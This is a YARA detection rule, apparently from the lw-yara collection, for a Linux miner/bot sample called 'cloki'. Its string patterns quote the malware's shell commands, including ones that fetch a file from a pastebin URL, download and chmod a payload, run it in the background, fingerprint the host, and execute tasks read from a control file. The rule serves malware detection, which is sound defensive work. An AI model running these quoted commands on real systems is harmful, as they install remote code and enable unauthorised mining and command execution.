rule infected_09_30_18_cloki {
  meta:
    description = "miner3 - file cloki"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara/"
    date        = "2018-09-30"
    hash1       = "3e7a3c01b4e7134909ec9ced955a82d77606e49d03ae0c25d666fad0b4d80f8f"

  strings:
    $x1  = "grep -q \"download\" \"comm.php\"; if [ $? -eq 0 ]; then touch download.txt; fi" fullword ascii
    $s2  = "curl -o prx http://pastebin.com/raw/i6uHVPMQ ;shuf -n 1 prx > wprx;rm prx;" fullword ascii
    $s3  = "grep -q \"tasks\" \"comm.php\"; if [ $? -eq 0 ]; then touch ntastk.txt; fi" fullword ascii
    $s4  = "grep -q \"imnewww\" \"comm.php\"; if [ $? -eq 0 ]; then touch imnew.txt; fi" fullword ascii
    $s5  = "var4=$(cat namic.txt) && var5=$(cat link.txt) && chmod 0777 $var4 || curl -o $var4 $var5 && chmod 0777 $var4" fullword ascii
    $s6  = "grep -q \"minwor\" \"templistge.txt\"; if [ $? -eq 0 ]; then rm templistge.txt && touch minr_here.txt; else rm templistge.txt; f" ascii
    $s7  = "(cat /var/lib/dbus/machine-id || ifconfig | grep HWaddr || uname -a || lspci ) | md5sum |cut -d\" \" -f1 > udic" fullword ascii
    $s8  = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
    $s9  = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
    $s10 = "rm link* namic* mip* comm* udic* pidi.txt" fullword ascii
    $s11 = "var4=$(cat namic.txt) && var=$(pidof $var4) && echo $var>pidi.txt && var2=$(cat pidi.txt) && kill 9 $var2 && rm pidi.txt" fullword ascii
    $s12 = "var2=$(grep -Eio \"[^tasks(].*[^)]\" \"comm.php\") && $var2" fullword ascii
    $s13 = "download.txt" fullword ascii
    $s14 = "curl -V;if [ $? -eq 0 ]; then touch curn.txt;fi;" fullword ascii
    $s15 = "var4=$(cat namic.txt) && $PWD/$var4 > /dev/null > /dev/null &" fullword ascii
    $s16 = "curl --connect-timeout 10 -o mip inet-ip.info || curl --connect-timeout 10 -o mip icanhazip.com || curl --connect-timeout 10 -o " ascii
    $s17 = "curl --connect-timeout 10 -o mip inet-ip.info || curl --connect-timeout 10 -o mip icanhazip.com || curl --connect-timeout 10 -o " ascii
    $s18 = "0 -o comH" fullword ascii
    $s19 = "imnew.txt" fullword ascii
    $s20 = "ntastk.txt" fullword ascii

  condition:
    (uint16(0) == 0x457f and
      filesize < 50KB and
      (1 of ($x*) and 4 of them)
    ) or (all of them)
}